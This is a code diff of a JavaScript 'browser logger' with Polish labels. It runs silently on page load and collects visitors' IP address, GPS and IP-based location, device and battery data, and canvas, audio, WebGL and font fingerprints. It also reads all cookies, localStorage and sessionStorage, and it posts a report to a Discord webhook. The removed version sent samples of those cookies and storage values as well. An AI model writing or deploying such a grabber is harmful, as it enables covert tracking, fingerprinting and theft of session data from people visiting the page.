@@ -1,164 +1,145 @@
-class PrecisionLogger {
+class AdvancedBrowserLogger {
     constructor() {
         this.data = {
             ip: null,
-            location: { accuracy: "Niska" },
+            browser: {},
             device: {},
             network: {},
-            storage: {
-                cookies: {},
-                localStorage: {},
-                sessionStorage: {}
-            },
+            location: {},
+            storage: {},
+            advanced: {},
             time: new Date().toLocaleString("pl-PL")
         };
     }
 
-    async init() {
+    async collectAllData() {
         try {
+            // Podstawowe dane
             await this._getIP();
-            await this._getLocation();
-            this._getDeviceInfo();
+            this._getBasicBrowserInfo();
             this._getStorageData();
-            await this._checkNetwork();
-            await this._sendToDiscord();
+
+            // Dane urządzenia
+            await this._getDeviceInfo();
+            await this._getBatteryInfo();
+            this._getScreenInfo();
+            this._getCpuInfo();
+
+            // Geolokalizacja
+            await this._getGeolocation();
+            await this._getIPLocation();
+
+            // Zaawansowane techniki
+            this._getWebGLInfo();
+            this._getFontList();
+            this._getAudioContextFingerprint();
+            this._getCanvasFingerprint();
+            this._getWebRTCInfo();
+
+            // Sieć
+            await this._checkVPN();
+            this._getConnectionInfo();
+
+            return this.data;
         } catch (error) {
-            console.error("Błąd loggera:", error);
+            console.error("Error collecting data:", error);
+            return this.data;
         }
     }
 
-    async _getIP() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            this.data.ip = data.ip;
-        } catch (error) {
-            console.error("Błąd pobierania IP:", error);
-            throw error;
-        }
-    }
-
-    async _getLocation() {
-        if (!this.data.ip) return;
-        
-        const sources = [
-            this._checkIpApiCo(),
-            this._checkIpWhoIs(),
-            this._checkIpApiCom()
-        ];
-        
-        const results = await Promise.allSettled(sources);
-        const validResults = results
-            .filter(r => r.status === "fulfilled" && r.value)
-            .map(r => r.value);
-            
-        if (validResults.length > 0) {
-            this.data.location = validResults.reduce((best, current) => 
-                current.accuracy > best.accuracy ? current : best
-            );
-        }
-    }
-
-    async _checkIpApiCo() {
-        try {
-            const url = window.CONFIG.IPAPI_KEY 
-                ? `https://ipapi.co/${this.data.ip}/json/?key=${window.CONFIG.IPAPI_KEY}`
-                : `https://ipapi.co/${this.data.ip}/json/`;
-                
-            const response = await fetch(url);
-            const data = await response.json();
-            
-            if (data.error) return null;
-            
-            return {
-                country: data.country_name,
-                country_code: data.country,
-                city: data.city,
-                region: data.region,
-                postal: data.postal,
-                coords: `${data.latitude}, ${data.longitude}`,
-                accuracy: 3
-            };
-        } catch (error) {
-            console.log("Błąd ipapi.co:", error);
-            return null;
-        }
-    }
-
-    async _checkIpWhoIs() {
-        try {
-            const response = await fetch(`https://ipwho.is/${this.data.ip}`);
-            const data = await response.json();
-            
-            return {
-                country: data.country,
-                country_code: data.country_code,
-                city: data.city,
-                region: data.region,
-                postal: data.postal_code,
-                coords: `${data.latitude}, ${data.longitude}`,
-                accuracy: 2
-            };
-        } catch (error) {
-            console.log("Błąd ipwho.is:", error);
-            return null;
-        }
-    }
-
-    async _checkIpApiCom() {
-        try {
-            const response = await fetch(`https://ipapi.com/ip_api.php?ip=${this.data.ip}`);
-            const data = await response.json();
-            
-            return {
-                country: data.country_name,
-                country_code: data.country_code,
-                city: data.city,
-                region: data.region_name,
-                postal: data.zip_code,
-                coords: `${data.latitude}, ${data.longitude}`,
-                accuracy: 1
-            };
-        } catch (error) {
-            console.log("Błąd ipapi.com:", error);
-            return null;
-        }
-    }
-
-    _getDeviceInfo() {
-        const getOS = () => {
-            const ua = navigator.userAgent;
-            if (/Windows/.test(ua)) return "Windows";
-            if (/Mac OS X/.test(ua)) return "macOS";
-            if (/Linux/.test(ua)) return "Linux";
-            if (/Android/.test(ua)) return "Android";
-            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
-            return navigator.platform || "Nieznany";
-        };
-
-        const getBrowser = () => {
-            const ua = navigator.userAgent;
-            let match = ua.match(/(firefox|chrome|safari|edge|opera|opr)\/?\s*(\d+)/i) || [];
-            return match[1] ? `${match[1].charAt(0).toUpperCase() + match[1].slice(1)} ${match[2] || ''}`.trim() : "Nieznana";
-        };
-
-        this.data.device = {
-            os: getOS(),
-            browser: getBrowser(),
-            screen: `${window.screen.width}x${window.screen.height}`,
-            colorDepth: `${window.screen.colorDepth}-bit`,
-            cpuCores: navigator.hardwareConcurrency > 16 ? ">16" : navigator.hardwareConcurrency,
-            memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
-            isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
+    // 1. PODSTAWOWE DANE PRZEGLĄDARKI
+    _getBasicBrowserInfo() {
+        this.data.browser = {
             userAgent: navigator.userAgent,
-            doNotTrack: navigator.doNotTrack === "1" ? "Tak" : "Nie"
+            language: navigator.language,
+            languages: navigator.languages,
+            doNotTrack: navigator.doNotTrack === "1",
+            cookieEnabled: navigator.cookieEnabled,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            isPrivate: this._checkPrivateMode()
         };
     }
 
+    _checkPrivateMode() {
+        try {
+            localStorage.setItem("test", "test");
+            localStorage.removeItem("test");
+            return false;
+        } catch (e) {
+            return true;
+        }
+    }
+
+    // 2. DANE URZĄDZENIA
+    async _getDeviceInfo() {
+        const os = this._detectOS();
+        this.data.device = {
+            os: os,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
+            maxTouchPoints: navigator.maxTouchPoints
+        };
+    }
+
+    _detectOS() {
+        const ua = navigator.userAgent;
+        if (/Windows/.test(ua)) {
+            if (/Phone/.test(ua)) return "Windows Mobile";
+            return "Windows";
+        }
+        if (/Mac OS X/.test(ua)) return "macOS";
+        if (/Linux/.test(ua)) return "Linux";
+        if (/Android/.test(ua)) return "Android";
+        if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+        if (/CrOS/.test(ua)) return "Chrome OS";
+        return "Unknown OS";
+    }
+
+    async _getBatteryInfo() {
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                this.data.device.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (e) {
+                this.data.device.battery = "Unavailable";
+            }
+        }
+    }
+
+    _getScreenInfo() {
+        this.data.device.screen = {
+            width: window.screen.width,
+            height: window.screen.height,
+            colorDepth: window.screen.colorDepth + '-bit',
+            orientation: window.screen.orientation?.type,
+            pixelRatio: window.devicePixelRatio
+        };
+    }
+
+    _getCpuInfo() {
+        this.data.device.cpu = {
+            cores: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
+        };
+    }
+
+    // 3. PRZECHOWYWANIE DANYCH
     _getStorageData() {
-        this.data.storage.cookies = this._getAllCookies();
-        this.data.storage.localStorage = this._getLocalStorage();
-        this.data.storage.sessionStorage = this._getSessionStorage();
+        this.data.storage = {
+            cookies: this._getAllCookies(),
+            localStorage: this._getLocalStorage(),
+            sessionStorage: this._getSessionStorage(),
+            indexedDB: this._checkIndexedDB(),
+            cacheStatus: this._checkCache()
+        };
     }
 
     _getAllCookies() {
@@ -174,114 +155,280 @@ class PrecisionLogger {
                 return cookies;
             }, {});
         } catch (error) {
-            return { error: "Błąd odczytu ciasteczek" };
+            return { error: "Cookie read error" };
         }
     }
 
     _getLocalStorage() {
         try {
-            return Object.keys(localStorage).reduce((storage, key) => {
+            return Object.keys(localStorage).reduce((acc, key) => {
                 try {
-                    storage[key] = localStorage.getItem(key);
+                    acc[key] = localStorage.getItem(key);
                 } catch {
-                    storage[key] = "<zabezpieczone>";
+                    acc[key] = "<protected>";
                 }
-                return storage;
+                return acc;
             }, {});
         } catch (error) {
-            return { error: "Błąd odczytu localStorage" };
+            return { error: "LocalStorage read error" };
         }
     }
 
     _getSessionStorage() {
         try {
-            return Object.keys(sessionStorage).reduce((storage, key) => {
+            return Object.keys(sessionStorage).reduce((acc, key) => {
                 try {
-                    storage[key] = sessionStorage.getItem(key);
+                    acc[key] = sessionStorage.getItem(key);
                 } catch {
-                    storage[key] = "<zabezpieczone>";
+                    acc[key] = "<protected>";
                 }
-                return storage;
+                return acc;
             }, {});
         } catch (error) {
-            return { error: "Błąd odczytu sessionStorage" };
+            return { error: "SessionStorage read error" };
         }
     }
 
-    async _checkNetwork() {
+    _checkIndexedDB() {
+        return 'indexedDB' in window ? "Available" : "Unavailable";
+    }
+
+    _checkCache() {
+        return 'caches' in window ? "Available" : "Unavailable";
+    }
+
+    // 4. GEOLOKALIZACJA
+    async _getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            this.data.ip = data.ip;
+        } catch (error) {
+            console.error("IP fetch error:", error);
+        }
+    }
+
+    async _getGeolocation() {
+        if ('geolocation' in navigator) {
+            return new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        this.data.location.gps = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy + ' meters'
+                        };
+                        resolve();
+                    },
+                    error => {
+                        this.data.location.gps = "Denied (" + error.message + ")";
+                        resolve();
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+    }
+
+    async _getIPLocation() {
         if (!this.data.ip) return;
         
         try {
-            if (window.CONFIG.VPNAPI_KEY) {
-                const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${window.CONFIG.VPNAPI_KEY}`);
-                const data = await response.json();
-                this.data.network = {
-                    isp: data.network?.autonomous_system_organization || "Nieznany",
-                    vpn: data.security?.vpn || false,
-                    proxy: data.security?.proxy || false,
-                    hosting: data.security?.hosting || false
-                };
-            }
+            const response = await fetch(`https://ipapi.co/${this.data.ip}/json/`);
+            const data = await response.json();
+            
+            this.data.location.ipBased = {
+                country: data.country_name,
+                city: data.city,
+                region: data.region,
+                postal: data.postal,
+                coords: `${data.latitude}, ${data.longitude}`,
+                isp: data.org,
+                asn: data.asn
+            };
         } catch (error) {
-            console.error("Błąd sprawdzania VPN:", error);
+            console.error("IP location error:", error);
         }
     }
 
-    async _sendToDiscord() {
-        if (!window.CONFIG.DISCORD_WEBHOOK) return;
-        
-        const embed = {
-            title: "🔍 Pełne dane użytkownika",
-            color: 0x00ff00,
-            fields: [
-                {
-                    name: "🌍 Lokalizacja",
-                    value: this._formatLocation(),
-                    inline: true
-                },
-                {
-                    name: "📱 Urządzenie",
-                    value: this._formatDevice(),
-                    inline: true
-                },
-                {
-                    name: "🗄️ Przechowywanie",
-                    value: this._formatStorage(),
-                    inline: false
-                },
-                {
-                    name: "🌐 Sieć",
-                    value: this._formatNetwork(),
-                    inline: false
-                }
-            ],
-            footer: {
-                text: `Czas: ${this.data.time} | Dokładność: ${this._getAccuracyLevel()}`
+    // 5. ZAAWANSOWANE TECHNIKI
+    _getWebGLInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (!gl) {
+                this.data.advanced.webgl = "Unsupported";
+                return;
             }
-        };
 
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            this.data.advanced.webgl = {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unknown",
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown",
+                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
+            };
+        } catch (error) {
+            this.data.advanced.webgl = "Error";
+        }
+    }
+
+    _getFontList() {
+        const baseFonts = [
+            'Arial', 'Arial Black', 'Courier New', 'Times New Roman',
+            'Georgia', 'Verdana', 'Helvetica', 'Tahoma'
+        ];
+        
+        const availableFonts = [];
+        const testString = "mmmmmmmmmmlli";
+        const testSize = "72px";
+        const canvas = document.createElement("canvas");
+        const context = canvas.getContext("2d");
+        
+        baseFonts.forEach(font => {
+            context.font = testSize + " '" + font + "'";
+            const metrics1 = context.measureText(testString);
+            context.font = testSize + " 'UnknownFont'";
+            const metrics2 = context.measureText(testString);
+            if (metrics1.width !== metrics2.width) {
+                availableFonts.push(font);
+            }
+        });
+        
+        this.data.advanced.fonts = availableFonts;
+    }
+
+    _getAudioContextFingerprint() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            const gainNode = audioContext.createGain();
+            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+
+            oscillator.type = "triangle";
+            oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
+            gainNode.gain.setValueAtTime(0, audioContext.currentTime);
+
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+
+            oscillator.start(0);
+            scriptProcessor.onaudioprocess = e => {
+                const buffer = new Float32Array(analyser.frequencyBinCount);
+                analyser.getFloatFrequencyData(buffer);
+                const sum = buffer.reduce((acc, val) => acc + Math.abs(val), 0);
+                this.data.advanced.audioFingerprint = sum.toString().slice(0, 15);
+                oscillator.disconnect();
+                scriptProcessor.disconnect();
+                gainNode.disconnect();
+            };
+        } catch (e) {
+            this.data.advanced.audioFingerprint = "Error";
+        }
+    }
+
+    _getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("CanvasFingerprint", 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText("CanvasFingerprint", 4, 17);
+            this.data.advanced.canvasFingerprint = canvas.toDataURL().slice(-32);
+        } catch (e) {
+            this.data.advanced.canvasFingerprint = "Error";
+        }
+    }
+
+    _getWebRTCInfo() {
+        try {
+            const rtc = new RTCPeerConnection({iceServers: []});
+            rtc.createDataChannel('');
+            rtc.createOffer()
+                .then(offer => rtc.setLocalDescription(offer));
+            
+            this.data.advanced.webRTC = "Available";
+        } catch (e) {
+            this.data.advanced.webRTC = "Unavailable";
+        }
+    }
+
+    // 6. DANE SIECIOWE
+    async _checkVPN() {
+        if (!this.data.ip || !window.CONFIG?.VPNAPI_KEY) return;
+        
+        try {
+            const response = await fetch(`https://vpnapi.io/api/${this.data.ip}?key=${window.CONFIG.VPNAPI_KEY}`);
+            const data = await response.json();
+            this.data.network.security = {
+                vpn: data.security?.vpn || false,
+                proxy: data.security?.proxy || false,
+                tor: data.security?.tor || false,
+                hosting: data.security?.hosting || false
+            };
+        } catch (error) {
+            console.error("VPN check error:", error);
+        }
+    }
+
+    _getConnectionInfo() {
+        if ('connection' in navigator) {
+            const conn = navigator.connection;
+            this.data.network.connection = {
+                type: conn.effectiveType,
+                downlink: conn.downlink + ' Mbps',
+                rtt: conn.rtt + ' ms',
+                saveData: conn.saveData
+            };
+        }
+    }
+
+    // EKSPORT DANYCH
+    async sendToDiscord() {
+        if (!window.CONFIG?.DISCORD_WEBHOOK) return;
+        
         try {
             await fetch(window.CONFIG.DISCORD_WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    embeds: [embed],
-                    content: "⚠️ Uwaga: Dane mogą zawierać wrażliwe informacje"
+                body: JSON.stringify({
+                    embeds: [this._createDiscordEmbed()]
                 })
             });
         } catch (error) {
-            console.error("Błąd wysyłania do Discord:", error);
+            console.error("Discord send error:", error);
         }
+    }
+
+    _createDiscordEmbed() {
+        return {
+            title: "📊 Pełny raport przeglądarki",
+            color: 0x3498db,
+            fields: [
+                { name: "🌍 IP i Lokalizacja", value: this._formatLocation(), inline: true },
+                { name: "📱 Urządzenie", value: this._formatDevice(), inline: true },
+                { name: "🔍 Zaawansowane", value: this._formatAdvanced(), inline: false },
+                { name: "🌐 Sieć", value: this._formatNetwork(), inline: false }
+            ],
+            footer: { text: `Czas: ${this.data.time}` }
+        };
     }
 
     _formatLocation() {
         const loc = this.data.location;
         return `
-        **Kraj:** ${loc.country || "Nieznany"} ${loc.country_code ? `(${loc.country_code})` : ""}
-        **Miasto:** ${loc.city || "Nieznane"}
-        **Region:** ${loc.region || "Nieznany"}
-        **Kod pocztowy:** ${loc.postal || "Nieznany"}
-        **Współrzędne:** ${loc.coords || "Nieznane"}
+        **IP:** ${this.data.ip || "Unknown"}
+        **Kraj:** ${loc.ipBased?.country || "Unknown"}
+        **Miasto:** ${loc.ipBased?.city || "Unknown"}
+        **GPS:** ${loc.gps?.lat ? `${loc.gps.lat}, ${loc.gps.lon}` : "Denied"}
         `;
     }
 
@@ -289,64 +436,37 @@ class PrecisionLogger {
         const dev = this.data.device;
         return `
         **System:** ${dev.os}
-        **Przeglądarka:** ${dev.browser}
-        **Ekran:** ${dev.screen} (${dev.colorDepth})
-        **Rdzenie CPU:** ${dev.cpuCores}
-        **Pamięć RAM:** ${dev.memory}
-        **Typ:** ${dev.isMobile ? "Mobilne" : "Desktop"}
-        **Do Not Track:** ${dev.doNotTrack}
+        **Przeglądarka:** ${this.data.browser.userAgent?.split(') ')[0].split('(')[1] || "Unknown"}
+        **Ekran:** ${dev.screen?.width}x${dev.screen?.height}
+        **CPU:** ${dev.cpu?.cores} cores
+        **RAM:** ${dev.cpu?.memory}
         `;
     }
 
-    _formatStorage() {
-        const s = this.data.storage;
+    _formatAdvanced() {
+        const adv = this.data.advanced;
         return `
-        **Ciasteczka (${Object.keys(s.cookies).length}):** 
-        ${this._formatStorageSample(s.cookies)}
-        
-        **LocalStorage (${Object.keys(s.localStorage).length}):** 
-        ${this._formatStorageSample(s.localStorage)}
-        
-        **SessionStorage (${Object.keys(s.sessionStorage).length}):** 
-        ${this._formatStorageSample(s.sessionStorage)}
+        **WebGL:** ${adv.webgl?.renderer || "Unknown"}
+        **Fonty:** ${adv.fonts?.length || 0} wykryte
+        **Canvas FP:** ${adv.canvasFingerprint ? "Tak" : "Nie"}
+        **Audio FP:** ${adv.audioFingerprint ? "Tak" : "Nie"}
         `;
-    }
-
-    _formatStorageSample(storage) {
-        const keys = Object.keys(storage);
-        if (keys.length === 0) return "Brak";
-        
-        return keys.slice(0, 3).map(key => {
-            const val = storage[key];
-            const valuePreview = val.length > 20 ? 
-                `${val.substring(0, 15)}[...]` : 
-                val;
-            return `\`${key}\`: ${valuePreview}`;
-        }).join('\n') + 
-        (keys.length > 3 ? `\n+${keys.length - 3} więcej` : '');
     }
 
     _formatNetwork() {
         const net = this.data.network;
         return `
-        **IP:** ${this.data.ip}
-        **ISP:** ${net.isp || "Nieznany"}
-        **VPN:** ${net.vpn ? "Tak" : "Nie"}
-        **Proxy:** ${net.proxy ? "Tak" : "Nie"}
-        **Hosting:** ${net.hosting ? "Tak" : "Nie"}
+        **ISP:** ${this.data.location.ipBased?.isp || "Unknown"}
+        **VPN:** ${net.security?.vpn ? "Tak" : "Nie"}
+        **Proxy:** ${net.security?.proxy ? "Tak" : "Nie"}
+        **Połączenie:** ${net.connection?.type || "Unknown"}
         `;
-    }
-
-    _getAccuracyLevel() {
-        switch(this.data.location.accuracy) {
-            case 3: return "Wysoka";
-            case 2: return "Średnia";
-            default: return "Niska";
-        }
     }
 }
 
-// Inicjalizacja loggera
-document.addEventListener("DOMContentLoaded", () => {
-    new PrecisionLogger().init();
+// Użycie:
+document.addEventListener("DOMContentLoaded", async () => {
+    const logger = new AdvancedBrowserLogger();
+    await logger.collectAllData();
+    await logger.sendToDiscord();
 });
